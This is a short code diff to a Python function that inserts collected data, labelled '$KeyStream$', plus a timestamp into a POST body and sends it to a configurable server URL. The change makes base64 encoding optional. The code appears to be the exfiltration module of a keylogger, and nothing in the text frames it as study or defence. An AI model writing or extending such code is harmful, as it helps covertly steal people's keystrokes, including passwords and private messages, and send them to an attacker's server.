@@ -43,11 +43,13 @@ def send_http_post():
 				#SERVER_URL = The server URL to post to
 				#POST_DATA = The post data to include. 
 				# Use $KeyStream$ for the area of the keystream
-				# Use $Date$ for the sending date            
-				
-				base64encodedData = base64.encodestring(data)
+				# Use $Date$ for the sending date         
+				#BASE64_ENC - if to encode as base64   
+				keysData = data
+				if BASE64_ENC == 'y':
+					keysData = base64.encodestring(keysData)
 				postData = POST_DATA
-				postData = postData.replace('$KeyStream$', base64encodedData)
+				postData = postData.replace('$KeyStream$', keysData)
 				postData = postData.replace('$Date$', str(timeInSecs) )
 				
 				requests.post(SERVER_URL, data=postData)
